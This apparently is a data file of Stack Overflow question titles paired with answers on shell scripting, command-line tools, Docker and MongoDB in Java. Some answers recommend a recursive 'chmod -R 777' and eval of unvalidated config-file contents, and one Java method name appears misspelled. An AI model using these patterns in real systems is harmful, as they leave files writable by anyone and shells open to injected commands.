    "How can I import data to Mongodb from Json file using java": "Suppose you can read the JSON string respectively. For example, you read the first JSON text\n{ \"test_id\" : 1245362, \"name\" : \"ganesh\", \"age\" : \"28\", \"Job\" : \n   {\"company name\" : \"company1\", \"designation\" : \"SSE\" } \n}\nand assign it to a variable (String json1), the next step is to parse it,\nDBObject dbo = (DBObject) com.mongodb.util.JSON.parse(json1);\nput all dbo into a list,\nList<DBObject> list = new ArrayList<>();\nlist.add(dbo);\nthen save them into database:\nnew MongoClient().getDB(\"test\").getCollection(\"collection\").insert(list);\nEDIT:\nIn the newest MongoDB Version you have to use Documents instead of DBObject, and the methods for adding the object look different now. Here's an updated example:\nImports are:\nimport com.mongodb.MongoClient;\nimport com.mongodb.client.MongoDatabase;\nimport org.bson.Document;\nThe code would like this (refering to the text above the EDIT):\nDocument doc = Document.parse(json1);\nnew MongoClient().getDataBase(\"db\").getCollection(\"collection\").insertOne(doc);\nyou can also do it the way with the list. but then you need\nnew MongoClient().getDataBase(\"db\").getCollection(\"collection\").insertMany(list);\nBut I think there is a problem with this solution. When you type:\ndb.collection.find()\nin the mongo shell to get all objects in the collection, the result looks like the following:\n{ \"_id\" : ObjectId(\"56a0d2ddbc7c512984be5d97\"),\n    \"test_id\" : 1245362, \"name\" : \"ganesh\", \"age\" : \"28\", \"Job\" :\n        { \"company name\" : \"company1\", \"designation\" : \"SSE\" \n    }\n}\nwhich is not exactly the same as before.",
    "Bash case statement": "Try this\n#!/bin/sh\n\nusage() {\n    echo `basename $0`: ERROR: $* 1>&2\n    echo usage: `basename $0` '[-a] [-b] [-c] \n        [file ...]' 1>&2\n    exit 1\n}\n\n\nwhile :\ndo\n    case \"$1\" in\n    -a|-A) echo you picked A;;\n    -b|-B) echo you picked B;;\n    -c|-C) echo you picked C;;\n    -*) usage \"bad argument $1\";;\n    *) break;;\n    esac\n    shift\ndone",
    "Scope of variables in KSH": "The default scope of a variable is the whole script.\nHowever, when you declare a variable inside a function, the variable becomes local to the function that declares it. Ksh has dynamic scoping, so the variable is also accessible in functions that are invoked by the function that declares the variable. This is tersely documented in the section on functions in the manual. Note that in AT&T ksh (as opposed to pdksh and derivatives, and the similar features of bash and zsh), this only applies to functions defined with the function keyword, not to functions defined with the traditional f () { \u2026 } syntax. In AT&T ksh93, all variables declared in functions defined with the traditional syntax are global.\nThe main way of declaring a variable is with the typeset builtin. It always makes a variable local (in AT&T ksh, only in functions declared with function). If you assign to a variable without having declared it with typeset, it's global.\nThe ksh documentation does not specify whether set -A makes a variable local or global, and different versions make it either. Under ksh 93u, pdksh or mksh, the variable is global and your script does print out the value. You appear to have ksh88 or an older version of ksh where the scope is local. I think that initializing str outside the function would create a global variable, but I'm not sure.\nNote that you should use a local variable to override the value of IFS: saving to another variable is not only clumsy, it's also brittle because it doesn't restore IFS properly if it was unset. Furthermore, you should turn off globbing, because otherwise if the string contains shell globbing characters ?*\\[ and one of the words happens to match one or more file on your system it will be expanded, e.g. set -A $string where string is a;* will result in str containing the list of file names in the current directory.\nset -A str\nfunction splitString {\n  typeset IFS=';' globbing=1\n  case $- in *f*) globbing=;; esac\n  set -f\n  set -A str $string\n  if [ -n \"$globbing\" ]; then set +f; fi\n}\nsplitString \"$string\"",
    "run bash script without input": "Two methods come to mind. The first (and better option) is to use the options in your package manager. For example:\napt-get install -y [YOUR_PACKAGE]\nif you use apt (type apt-get install --help for more help there).\nThe second is more of a quick-'n-dirty one...use a pipe after yes:\nyes | apt-get install [YOUR_PACKAGE]\nwhich always brings a smile to my face :p\nThe latter option also answers yes to ALL other questions, which can be handy (errors etc.) but can be risky (which is the reason those questions are there in the first place!)",
    "How to convert command output to an array line by line in bash?": "You need to change your Internal Field Separator variable (IFS) to a newline first.\n$ IFS=$'\\n'; arr=( $(echo -e \"a b\\nc\\nd e\") ); for i in ${arr[@]} ; do echo $i ; done\na b\nc\nd e",
    "Edit a property value in a property file from shell script": "If your property file is delimited with = sign like this -\nparam1=value1\nparam2=value2\nparam3=value3\nthen you can use awk do modifiy the param value by just knowing the param name. For example, if we want to modify the param2 in your property file, we can do the following -\nawk -F\"=\" '/^param2/{$2=\"new value\";print;next}1' filename > newfile\nNow, the above one-liner requires you to hard code the new value of param. This might not be the case if you are using it in a shell script and need to get the new value from a variable.\nIn that case, you can do the following -\nawk -F\"=\" -v newval=\"$var\" '/^param2/{$2=newval;print;next}1' filename > newfile\nIn this we create an awk variable newval and initialize it with your script variable ($var) which contains the new parameter value.",
    "Command Line app arguments style guide": "Look at this standard library module: http://docs.python.org/library/argparse.html\nIt will make your life much easier implementing a command line interface, and you end up using its style guide.\nNote that argparse only became available in Python 2.7 (or 3.2, in the 3.x series). Before that there was http://docs.python.org/library/optparse.html, which results in a similar command line interface, but is not as much fun to use.",
    "Reading a config file from a shell script": "You don't want source it, so you should:\n1.read the config, 2.verify lines 3.eval them\nCONFIGFILE=\"/path/to/config\"\necho \"=$ADMIN= =$TODO= =$FILE=\" #these variables are not defined here\neval $(sed '/:/!d;/^ *#/d;s/:/ /;' < \"$CONFIGFILE\" | while read -r key val\ndo\n    #verify here\n    #...\n    str=\"$key='$val'\"\n    echo \"$str\"\ndone)\necho =$ADMIN= =$TODO= =$FILE= #here are defined\nsample of config file\nADMIN: root\nTODO: delete\n\nvar=badly_formtatted_line_without_colon\n\n#comment\nFILE: /path/to/file\nif you run the above sample should get (not tested):\n== == ==\n=root= =delete= =/path/to/file=\nsure this is not the best solution - maybe someone post a nicer one.",
    "Can Ruby access output from shell commands as it appears?": "You are looking for pipes. Here is an example:\n# This example runs the netstat command via a pipe\n# and processes the data in Ruby as it come back\n\npipe = IO.popen(\"netstat 3\")\nwhile (line = pipe.gets)\n  print line\n  print \"and\"\nend",
    "Input from within shell script": "You can pipe in whatever text you'd like on stdin and it will be just the same as having the user type it themselves. For example to simulating typing \"Y\" just use:\necho \"Y\" | myapp\nor using a shell variable:\necho $ANSWER | myapp\nThere is also a unix command called \"yes\" that outputs a continuous stream of \"y\" for apps that ask lots of questions that you just want to answer in the affirmative.",
    "Default value with shell expressions in Dockerfile ARG and ENV": "From the documentation:\nThe ${variable_name} syntax also supports a few of the standard bash modifiers as specified below:\n${variable:-word} indicates that if variable is set then the result will be that value. If variable is not set then word will be the result.\n${variable:+word} indicates that if variable is set then word will be the result, otherwise the result is the empty string.\nENV is special docker build command and doesn't support this. What you are looking for is to run Shell commands in ENV. So this won't work.\nPossible solution is to use a bash script\ncuda_version.sh\n#!/bin/bash\nCUDA_FULL=\"${CUDA_VERSION:-8.0.61_375.26}\"\nCUDA_MAJOR=\"$(echo ${CUDA_VERSION:-8.0.61_375.26} | cut -d. -f1)\"\nCUDA_MINOR=\"$(echo ${CUDA_VERSION:-8.0.61_375.26} | cut -d. -f2)\"\nCUDA_MAJMIN=\"$CUDA_MAJOR.$CUDA_MINOR\" \nCUDNN_FULL=\"${CUDNN_VERSION:-7.0.1}\"\nCUDNN_MAJOR=\"$(echo ${CUDNN_VERSION:-7.0.1} | cut -d. -f1)\"\nCUDNN_MINOR=\"$(echo ${CUDNN_VERSION:-7.0.1} | cut -d. -f2)\"\nCUDNN_MAJMIN=\"$CUDNN_MAJOR.$CUDNN_MINOR\"\nAnd change your dockerfile to\nARG CUDA_VERSION=8.0.61_375.26\nARG CUDNN_VERSION=7.0.1\n\nENV CUDA_VERSION=${CUDA_VERSION} CUDNN_VERSION=${CUDNN_VERSION}\nCOPY cuda_version.sh /cuda_version.sh\nRUN bash -c \"source /cuda_version.sh && curl -LO https://.../${CUDNN_FULL}/.../...${CUDA_MAJMIN}...\"\nYou can remove the default values from your shell file as they will always be there from the Dockerfile arguments/environment",
    "What's the difference between: \". [script]\" or \"source [script]\", \"bash [script] or $SHELL [script]\", and \"./ [script]\" or \"[script]\"?": ". script and source script execute the contents of script in the current environment, i.e. without creating a subshell. On the upside this allows script to affect the current environment, for example changing environment variables or changing the current work directory. On the downside this allows script to affect the current environment, which is a potential security hazard.\nbash script passes script to the bash interpreter to execute. Whatever shebang is given by script itself is ignored. (\"Shebang\" referring to the first line of script, which could e.g. read #!/bin/bash, or #!/usr/bin/perl, or #!/usr/bin/awk, to specify the interpreter to be used.)\n$SHELL script passes script to whatever is your current shell interpreter to execute. That may, or may not, be bash. (The environment variable SHELL holds the name of your current shell interpreter. $SHELL, if running bash, is evaluated to /bin/bash, with the effect detailed in the previous paragraph.)\n./script executes the contents of a file script in the current work directory. If there is no such file, an error is generated. The contents of $PATH have no effect on what happens.\nscript looks for a file script in the directories listed in $PATH, which may or may not include the current work directory. The first script found in this list of directories is executed, which may or may not be the one in your current work directory.",
    "Why isn't DYLD_LIBRARY_PATH being propagated here?": "Presumably, you are running El Capitan (OS X 10.11) or later. It's a side effect of System Integrity Protection. From the System Integrity Protection Guide: Runtime Protections article:\nWhen a process is started, the kernel checks to see whether the main executable is protected on disk or is signed with an special system entitlement. If either is true, then a flag is set to denote that it is protected against modification. \u2026\n\u2026 Any dynamic linker (dyld) environment variables, such as DYLD_LIBRARY_PATH, are purged when launching protected processes.\nAll of the system-provided interpreters, including /bin/sh, are protected in this fashion. Therefore, when you invoke sh, all DYLD_* environment variables are purged.\nYou could write a shell script which sets DYLD_LIBRARY_PATH and then executes .sconf_temp/conftest_7. You can use the the shell interpreter to execute that \u2014 indeed, you must \u2014 and the environment variable will be fine, since the purging happens when a protected executable is started. Basically, this approach is analogous to the working example in your question, but encapsulated in a shell script.",
    "Bash decimal to base 62 conversion": "I do really appreciate the solution you came up with, and I guess there's no way around it straight with bash. Here's the little point you've missed:\nBASE62=($(echo {0..9} {a..z} {A..Z}))\nfor i in $(bc <<< \"obase=62; 9207903953\"); do\n    echo -n ${BASE62[$(( 10#$i ))]}\ndone && echo\nOutput:\na39qrT",
    "How does shell execute piped commands?": "Considering for example cat | grep, the shell first forks itself to start cat, and then forks itself once more to start grep.\nBefore calling one of the exec* family of functions in the two newly created processes to start the two programs, the tricky part is setting up the pipe and redirecting the descriptors. The pipe(2) system call is used in the shell process before forking to return a pair of descriptors which both children inherit - a reading end and a writing end.\nThe reading end will be closed in the first process (cat), and stdout will be redirected to the writing end using the dup2(2) system call. Similarly, the writing end in the second process (grep) will be closed and stdin will be redirected to the reading end again using dup2(2).\nThis way both programs are unaware of a pipe because they just work with the standard input/output.",
    "read: Illegal option -s in shell scripting": "I take it you're using Debian/Ubuntu, or a BSD-derivative?\nWhen you execute a command like run sh init.sh (although I'm not myself familiar with this run command) you are overriding the #!/bin/bash shebang. In your case sh is a strictly compliant POSIX shell like dash, where, in fact, the only argument to read that is not an extension is -r.\nSo maybe you'd want to use run bash init.sh instead?",
    "wget: what does this trailing dash represent/do?": "By convention (which not all programs follow), a dash in filename position refers to stdin or stdout, as appropriate. Since this is an argument to -O (output), it refers to stdout.\nA more verbose way to write this (on Linux or other operating systems where /dev/stdout is usable by programs other than just the shell) would be:\nwget http://ipinfo.io/ip --quiet --output-document=/dev/stdout\nAs it happens, this behavior is defined by the POSIX Utility Syntax Guidelines. Specifically:\nGuideline 5: One or more options without option-arguments, followed by at most one option that takes an option-argument, should be accepted when grouped behind one '-' delimiter.\n...thus, -qO is treated identically to -q -O.\nGuideline 13: For utilities that use operands to represent files to be opened for either reading or writing, the '-' operand should be used to mean only standard input (or standard output when it is clear from context that an output file is being specified) or a file named -.\n...thus, the behavior regarding - is explicitly specified.",
    "How to make bash/shell \"set -x\" sticky across nested calls to shell scripts": "You can use the SHELLOPTS environment variable to make the \"sub\" shell use the same options. You just have to export it before any calls to subshells:\nexport SHELLOPTS",
    "Difference between starting a command using init.d script and service start": "They do the same thing except service runs the script in a controlled environment. From the service(8) man page:\nDESCRIPTION\nservice runs a System V init script in as predictable environment as possible, removing most environment variables and with current working directory set to /.\nENVIRONMENT\nLANG, TERM\n        The only environment variables passed to the init scripts.",
    "How to give 777 permission to multiple directories at a time in unix?": "Assuming XYZ is the path to the root of your files, you can use globbing to exactly match the files you want:\nchmod 777 /XYZ/{ABCD,EGF,GHY}\nThen you can use the -R flag to do it recursively on all files and folders contained in these folders.\nchmod -R 777 /XYZ/{ABCD,EGF,GHY}\nTo apply a non-recursive chmod on the 3 folder plus the parent, you can use:\nchmod 777 /XYZ/{ABCD,EGF,GHY,}\nNote the last comma, to include the directory itself in the globbing",
    "Control Android LED from shell": "",
    "Bash command substitution ( $(...) ) forcing process to foreground": "If you want the backgrounded process to not interfere with command substitution, you have to disconnect its stdout. This will return immediately:\n$ cat bg.sh \n#!/bin/sh\necho before\nsleep 5 >/dev/null &\necho after\n$ date; x=$(./bg.sh); date; echo \"$x\"\nSat Jun  1 13:02:26 EDT 2013\nSat Jun  1 13:02:26 EDT 2013\nbefore\nafter\nYou will lose the ability to capture the backgrounded process's stdout, but if you're running it in the background you probably don't care. the bg.sh process can always write to disk.",
    "Why does ZSH hang on empty redirection?": "I'm not really a zsh user but seems like > file in zsh is the same as cat > file in bash. To create a new file or truncate it in zsh, use : > file. This also works for bash.\nUPDATE:\nFound this in zsh manual:\nREDIRECTIONS WITH NO COMMAND:\nWhen a simple command consists of one or more redirection operators and zero or more parameter assignments, but no command name, zsh can behave in several ways.\nIf the parameter NULLCMD is not set or the option CSH_NULLCMD is set, an error is caused. This is the csh behavior and CSH_NULLCMD is set by default when emulating csh.\nIf the option SH_NULLCMD is set, the builtin : is inserted as a command with the given redirections. This is the default when emulating sh or ksh.\nOtherwise, if the parameter NULLCMD is set, its value will be used as a command with the given redirections. If both NULLCMD and READNULLCMD are set, then the value of the latter will be used instead of that of the former when the redirection is an input. The default for NULLCMD is cat and for READNULLCMD is more.\nOn my system, the default is:\n$ echo $ZSH_VERSION\n4.3.10\n$ echo $NULLCMD\ncat\n$ echo $READNULLCMD\n/usr/bin/pager\n$",
    "How to search backwards in emacs shell?": "Type M-r , search for something, and then press C-r to repeat the same search in the command history.",
    "How to iterate over the characters of a string in a POSIX shell script?": "It's a little circuitous, but I think this'll work in any posix-compliant shell. I've tried it in dash, but I don't have busybox handy to test with.\nvar='ab * cd'\n\ntmp=\"$var\"    # The loop will consume the variable, so make a temp copy first\nwhile [ -n \"$tmp\" ]; do\n    rest=\"${tmp#?}\"    # All but the first character of the string\n    first=\"${tmp%\"$rest\"}\"    # Remove $rest, and you're left with the first character\n    echo \"$first\"\n    tmp=\"$rest\"\ndone\nOutput:\na\nb\n\n*\n\nc\nd\nNote that the double-quotes around the right-hand side of assignments are not needed; I just prefer to use double-quotes around all expansions rather than trying to keep track of where it's safe to leave them off. On the other hand, the double-quotes in [ -n \"$tmp\" ] are absolutely necessary, and the inner double-quotes in first=\"${tmp%\"$rest\"}\" are needed if the string contains \"*\".",
    "sed gives error with unterminated substitute in regular expression": "Here's a MCVE for your problem:\nbigip_management_ip=\" 54.83.174.153\"\nsed 's/x.x.x.x/'$bigip_management_ip'/g'\nWhen executed on macOS, you get:\nsed: 1: \"s/x.x.x.x/\": unterminated substitute in regular expression\nThe problem is the leading space in the variable causing word splitting due to a lack of quoting. ShellCheck warns about this:\nIn /Users/myuser/myscript line 2:\n    sed 's/x.x.x.x/'$bigip_management_ip'/g'\n                    ^-- SC2086: Double quote to prevent globbing and word splitting.\nYou should always quote your variables unless you're sure you can't:\nsed \"s/x.x.x.x/$bigip_management_ip/g\"",
    "gcloud command to retrieve metadata of a specific key": "",
    "sed print Nth character": "using GNU awk:\nawk 'BEGIN{FS=\"\";a=\"\";b=\"\";c=\"\";}{a=a$1; b=b$3; c=c$5;}END{print a ORS c ORS b}' filename\noutput:\nc8431498 0e639b1bd45c \nc843149c405a3c 10 47c3\n       |> || |< |< | >",
    "How to append line to empty file using sed, but not echo?": "You can use tee:\necho \"something\" | sudo tee /etc/myfile   # tee -a to append\nOr redirect to /dev/null if you don't want to see the output:\necho \"something\" | sudo tee /etc/myfile > /dev/null\nAnother option is to use sh -c to perform the full command under sudo:\nsudo sh -c 'echo \"something\" > /etc/myfile'\nRegarding doing this with sed: I don't think it is possible. Since sed is a stream editor, if there is no stream, there is nothing it can do with it.",
    "Portable way to resolve host name to IP address": "I've no experience with OpenWRT or Busybox but the following one-liner will should work with a base installation of Cygwin or Ubuntu:\nipaddress=$(LC_ALL=C nslookup $host 2>/dev/null  | sed -nr '/Name/,+1s|Address(es)?: *||p')\nThe above works with both the Ubuntu and Windows version of nslookup. However, it only works when the DNS server replies with one IP (v4 or v6) address; if more than one address is returned the first one will be used.\nExplanation\nLC_ALL=C nslookup sets the LC_ALL environment variable when running the nslookup command so that the command ignores the current system locale and print its output in the command\u2019s default language (English).\nThe 2>/dev/null avoids having warnings from the Windows version of nslookup about non-authoritative servers being printed.\nThe sed command looks for the line containing Name and then prints the following line after stripping the phrase Addresses: when there's more than one IP (v4 or 6) address -- or Address: when only one address is returned by the name server.\nThe -n option means lines aren't printed unless there's a p commandwhile the-r` option means extended regular expressions are used (GNU sed is the default for Cygwin and Ubuntu).",
    "Fish shell command subsitution": "You could just pull the substitution out of the quotes\necho \"I am:\" (whoami)\nTo bring this answer up to date: fish 3.4 introduced $(...) command substitutions that are expanded within double quotes\necho \"I am: $(whoami)\"\nCommand substitution",
    "bash : Illegal number": "You have syntax error in your if condition, use this if condition:\nif [ \"$EUID\" -ne 0 ];\nOR using [[ and ]]\nif [[ \"$EUID\" -ne 0 ]];",
    "Run two commands with a crontab": "You can have multiple commands in a single crontab line. Just separate them with semicolons:\ncrontab -l | { /bin/cat; /bin/echo \"* 3 * * * cd /etc/application ; scrapy crawl\"; } | crontab -",
    "Shell scripting vs programming language": "Shell scripts are excellent for concise filesystem operations and scripting the combination of existing functionality in filters and command line tools via pipes.\nWhen your needs are greater - whether in functionality, robustness, performance, efficiency etc - then you can move to a more full-featured language. They tend to offer some combination of:\ntype safety\nmore advanced containers\nbetter control over variable lifetimes and memory usage\nthreading\nadvanced IPC like shared memory and TCP/IP\nfull binary I/O capabilities, memory mapped file access etc.\naccess to OS APIs and myriad powerful libraries\nbetter readability and maintainability as the project size increases\nsupport for more advanced programming paradigms: Object Orientation, Functional Programming, Generative Programming etc.\nbetter error-checking before your program starts running, hence less dependent on test case coverage",
    "What is up with [A-Z] meaning [A-Za-z]?": "It's actually [A-Za-y], and it has to do with language collation. If you want to override it then set $LC_COLLATE appropriately; either of C or POSIX should do.",
    "How to access Windows shell context menu items?": "The key to obtain the Shell Context menu is use the IContextMenu interface.\ncheck this great article Shell context menu support for more details.\nUPDATE\nfor delphi examples you can see the JclShell unit from the JEDI JCL (check the DisplayContextMenu function) and the ShellCtrls unit included in the samples folder of Delphi.",
    "Writing A Fish Shell Script With an Optional Argument": "Wrap your switch statement like this:\nif set -q argv\n    ...\nend\nAlso, I think your default case should be case '*'.",
    "Keeping shell configurations in sync across multiple machines": "I have folder on Dropbox with global, per OS, and per machine shell configs:\n$ ls ~/Dropbox/shell/bash\nbashbootstrap  bashrc\nbashrc-Darwin  bashrc-Darwin-laptopname  bashrc-Darwin-mininame\nbashrc-Linux  bashrc-Linux-machineone  bashrc-Linux-machinetwo\nbashrc is loaded on every machine, bashrc-Linux, bashrc-Darwin are loaded on their respective OSes, and several configs are specific to individual machines. (By the way, Darwin is the name of OS X's BSD-like kernel.)\nWhat ties it all together is the bashbootstrap file. It loads each applicable config file in order of increasing specificity, this allows per OS and per machine overrides to have higher precedence. Additionally, we silently skip missing config files; you need not create empty config files for each of your machines to keep the script happy.\nOn a new machine, after installing Dropbox on ~/Dropbox, I move away the default .bashrc and just symlink the bootstrap file in its place instead:\n$ mv ~/.bashrc ~/.bashrc.bak\n$ ln -s ~/Dropbox/shell/bash/bashbootstrap  ~/.bashrc\nOh, and here are the contents of the bashbootstrap file:\nif [ -z \"$PS1\" ]; then\n   return\nfi\n\ndropboxshelldir=~/Dropbox/shell\ndropboxdir=$dropboxshelldir/bash\nmasterbashrc=$dropboxdir/bashrc\nosbashrc=$masterbashrc-`uname`\nlocalbashrc=$osbashrc-`hostname | cut -d. -f1`\n\necho -n \"Applicable shell configs: \"\nfor bashfile in \"$masterbashrc\" \"$osbashrc\" \"$localbashrc\"; do\n  if [ -r $bashfile ]; then\n    . $bashfile\n    echo -n \"`basename $bashfile` \"\n  fi\ndone\necho\n\n# Set convenience aliases\nmyed=${VISUAL:-${EDITOR:-vim}}\nalias editbashrc=\"$myed $masterbashrc\"\nalias editosbashrc=\"$myed $osbashrc\"\nalias editlocalbashrc=\"$myed $localbashrc\"\nOne final note, this script also provides three convenience aliases for editing your Bash config files without having to remember where they are stored.\neditbashrc: Edit the global config file.\neditosbashrc: Edit the OS-specific config file.\neditlocalbashrc: Edit the machine-specific config file.\nI only tested this on Bash, but it could work on other Bash like shells. But, as they say, your mileage may vary.\nI made a blog post about this here.",
    "Set KUBECONFIG environment variable dynamically": "You can try something like that:\nexport KUBECONFIG=$(for i in $(find /Users/anandabhishe/gitlab/ -iname 'kubeconfig.yaml') ; do echo -n \":$i\"; done | cut -c 2-)",
    "IFS=: leads to different behavior while looping over colon-separated values": "I found this a very interesting experiment. Thank you for that.\nTo understand what is going on, the relevant section from man bash is this:\n  Word Splitting\n      The  shell  scans the results of parameter expansion, command substitu-\n      tion, and arithmetic expansion that did not occur within double  quotes\n      for word splitting.\nThe key is the \"results of ...\" part, and it's very subtle. That is, word splitting happens on the result of certain operations, as listed there: the result of parameter expansion, the result of command substitution, and so on. Word splitting is not performed on string literals such as foo:bar:baz.\nLet's see how this logic plays out in the context of your examples.\nExperiment 1\nIFS=:\nfor i in foo:bar:baz\ndo\n    echo $i\ndone\nThis produces the following output:\nfoo bar baz\nNo word splitting is performed on the literal foo:bar:baz, so it doesn't matter what is the value of IFS, as far as the for loop is concerned.\nWord splitting is performed after parameter expansion on the value of $i, so foo:bar:baz is split to 3 words, and passed to echo, so the output is foo bar baz.\nExperiment 2\nIFS=:\nfor i in foo:bar:baz\ndo\n    unset IFS\n    echo $i\ndone\nThis produces the following output:\nfoo:bar:baz\nOnce again, no word splitting is performed on the literal foo:bar:baz, so it doesn't matter what is the value of IFS, as far as the for loop is concerned.\nWord splitting is performed after parameter expansion on the value of $i, but since IFS was unset, its default value is used to perform the split, which is <space><tab><newline>. But since foo:bar:baz doesn't contain any of those, it remains intact, so the output is foo:bar:baz.\nExperiment 3\nIFS=:\nvar=foo:bar:baz\nfor i in $var\ndo\n    echo $i\ndone\nThis produces the following output:\nfoo\nbar\nbaz\nAfter the parameter expansion of $var, word splitting is performed using the value of IFS, and so for has 3 values to iterate over, foo, bar, and baz. The behavior of echo is trivial here, the output is one word per line.\nThe bottomline is: word splitting is not performed on literal values. Word splitting is only performed on the result of certain operations.\nThis is not all that surprising. A string literal is much like an expression written enclosed in double-quotes, and you wouldn't expect word splitting on \"...\".",
    "BASH : Difference between '-' and '--' options": "Long-form (--foo) options are a GNU extension -- something present in GNU ls, but not present at all in the POSIX standard setting requirements for UNIX tools, so other versions of ls are not obliged to support these options. The entire word (foo) is meaningful in this case. This nomenclature was added more recently, and is more expressive than the short form (and doesn't have namespace limitations).\nShort-form options (-al) are, at least in form, standardized (though extensions can add new ones). They're handled character by character, one letter at a time -- so -al means -a (show hidden files) and -l (long output), rather than having -al have its own meaning in this case. This is the original syntax for UNIX command-line options, and is thus supported not only for terseness but also for backwards compatibility.",
    "Change the system version of nodejs - ubuntu": "Verify that default node is really coming from nvm with which node, if its not, you can safely run :\nrm `which node`\nTo set the default node version with nvm use :\nnvm alias default 0.10.32\nIf you have many apps that use different node version, add a .npmrc in the root directory in each of them. .npmrc only contains the version, e.g. \"v0.10.32\".\nThen each time you cd into a project run\nnvm use",
    "copying last bash command into clipboard": "I'm not sure to understand what you said about \"failing when attempting to modify the output of history\", so I hope my solution will suit you. I'm using fc to get the last command:\nfc -ln -1 | xsel --clipboard\nHere are the meaning of the options:\nl is to use the standard output\nn is to hide the command history number\n-1 is to get the last command from the history",
    "how to exclude multiple pattern using grep": "Try below:\n grep -rI \"PatternToSearch\" ./path --exclude={*log*,tags}\nJust use \",\" to separate patterns.\nSeems duplicated with how do I use the grep --include option for multiple file types?",
    "Zsh color partial tab completions": "Yes, you can do it with things like that:\nzstyle -e ':completion:*:default' list-colors 'reply=(\"${PREFIX:+=(#bi)($PREFIX:t)(?)*==02=01}:${(s.:.)LS_COLORS}\")'\nJust change the 01 and 02 colors so it matches your taste, for example to match your screenshot:\nzstyle -e ':completion:*:default' list-colors 'reply=(\"${PREFIX:+=(#bi)($PREFIX:t)(?)*==34=34}:${(s.:.)LS_COLORS}\")';\n(Taken from reddit thread, added here to help people searching for this, like I did.)",
    "Run shell command with input redirections from python 2.4?": "You have to feed the file into mysql stdin by yourself. This should do it.\nimport subprocess\n...\nfilename = ...\ncmd = [\"mysql\", \"-h\", ip, \"-u\", mysqlUser, dbName]\nf = open(filename)\nsubprocess.call(cmd, stdin=f)",
    "Surprising array expansion behaviour": "IFS is used not just to join the elements of ${X[*]}, but also to split the unquoted expansion $@. For log1 \"${X[*]}\", the following happens:\n\"${X[*]}\" expands to a|b as expected, so $1 is set to a|b inside log1.\nWhen $@ (unquoted) is expanded, the resulting string is a|b.\nThe unquoted expansion undergoes word-splitting with | as the delimiter (due to the global value of IFS), so that echo receives two arguments, a and b.",
    "What are the rules to write robust shell scripts?": "A couple of ideas:\nUse -e flag in the shebang, for example #!/bin/sh -e. That way the script will stop at the first error. It's a bit like throwing a RuntimeException in Java. This probably did save my ass a couple of times, and I have a feeling it would helped you too in this case.\nHandle the exit codes of all the statements in your scripts. Actually using -e in the shebang will force you to do this.\nDon't chain commands with ;. Use && instead. Again, using -e in the shebang will force you to do this.\nProperly quote paths that might contain spaces or other special characters.\nIt's best if a script doesn't do dangerous things when used without parameters.\nFor non-trivial scripts, make sure to -h and --help flags that print a helpful message. (I use this script to generate scripts with flag parsing.) This should be mandatory for scripts that can do dangerous things when called without parameters.\nExit your scripts with an explicit exit 1 on any non-normal exit. It's a common mistake to handle an error in an if block, echo some helpful message, and then exit without any arguments. Since exit uses the exit code of the last command, in this case echo, it will exit with success. Note that in the sample script I linked earlier, I exit 1 after printing the help message when handling the --help flag.\nIf you don't need bash features, use a #!/bin/sh shebang and try to stay compatible with older versions. Being portable is a kind of robustness, I think.\nUse $() instead of ``. Easier to read ~~ harder to make mistakes.\nFormat your code nicely and consistently. Easier to read ~~ robustness.\nBe aware of the differences between platforms. For example both date --iso and date +%F print dates in the format 2013-11-17, but the first only works in GNU systems, the second works in BSD and Solaris too. So use date +%F always, it works everywhere. There are of course 100s of examples like this. If you're doing something you're not used to every day, try to check if it works in a different system too.\nTest for empty variables, especially in dangerous commands like rm -fr. For example the result of rm -rf \"$TOPDIR/$OBJDIR\" can be disastrous if TOPDIR or/and OBJDIR happens to be empty or unset. In general, double-check or triple check the possible parameter values of dangerous commands like this.\nDon't push the limits of shell scripts. Scripts are supposed to be glue-code. If you catch yourself doing something tricky, or that you need obscure features, chances are you're better off moving to more powerful languages.\nIn the end, none of this will prevent you from making stupid mistakes.\nPS: I will keep coming back and add more things as I remember them. Please feel free to suggest improvements and I'll add them. Thanks.",
    "Override a shell function, keep a reference to the original one": "The answer by Jens is correct. Just adding below code for completeness.\nYou can simply use it as below:\neval \"`declare -f f | sed '1s/.*/_&/'`\" #backup old f to _f\n\nf(){\n    echo wrapper\n    _f # pass \"$@\" to it if required.\n}\nI had used same logic here: https://stackoverflow.com/a/15758880/793796",
    "Combine output of two command in unix system": "Shiplu has a nice simple solution, in bash you can do it without using variables:\nfor x in *; do \n  echo \"$(ls -dl $x) $(file $x)\"\ndone;\nOr:\nfor x in *; do echo \"$(ls -dl $x) $(file $x)\"; done;\nIn bash, $(cmd) takes the output of cmd and places it onto the command line, which is very useful for situations like this.\nThe $() form can be less error prone than using backticks (`cmd`) because it nests safely:\necho $(ls -l $(which bash))\nWith backticks you have to multiply escape things like quotes",
    "How do I call a local shell script from a web server?": "This tutorial looks good, but it's a bit brief.\nI have apache installed. If you don't: sudo apt-get install apache2.\ncd /usr/lib/cgi-bin\n\n# Make a file and let everyone execute it\nsudo touch test.sh && chmod a+x test.sh \nThen put the some code in the file. For example:\n#!/bin/bash\n# get today's date\nOUTPUT=\"$(date)\"\n# You must add following two lines before\n# outputting data to the web browser from shell\n# script\n echo \"Content-type: text/html\"\n echo \"\"\n echo \"<html><head><title>Demo</title></head><body>\"\n echo \"Today is $OUTPUT <br>\"\n echo \"Current directory is $(pwd) <br>\"\n echo \"Shell Script name is $0\"\n echo \"</body></html>\"\nAnd finally open your browser and type http://localhost/cgi-bin/test.sh\nIf all goes well (as it did for me) you should see...\nToday is Sun Dec 4 ...\nCurrent directory is /usr/lib/cgi-bin Shell\nShell Script name is /usr/lib/cgi-bin/test.sh",
    "Using the linux 'file' command to determine type (ie. image, audio, or video)": "The results from file are less than perfect, and it has more problems with some types of files than others. File basically just looks for particular pieces of binary data in predictable patterns to figure out filetypes.\nUnfortunately, in particular, some of the filetypes often used for video fall into this \"problematic\" category. The newer container formats like .mp4 and .mkv usually have several different MIME types that should properly depend on what type of data is being contained. For example, an .mp4 could properly be identified as video/mp4, audio/mp4, or application/mp4 depending on the content.\nIn practice, file often makes guesses that simply conform with common usage, and it may work perfectly well for you. For example, while I mentioned some theoretical difficulties with identifying Matroska files correctly, file basically just assumes that any Matroska file is a video. On the other hand, the usage of the Ogg container is more evenly split between audio and video, and I believe the current version of file just splits the difference, and identifies Ogg files as application/ogg, which wouldn't fall into any of your categories.\nThe one thing I can say with certainty is that you want the most up-to-date version of file you can get your hands on. The \"magic\" files that contain the patterns to match against and the MIME types that will result from a match are updated fairly often to include newer filetypes like WebM, or just to improve accuracy for older types.",
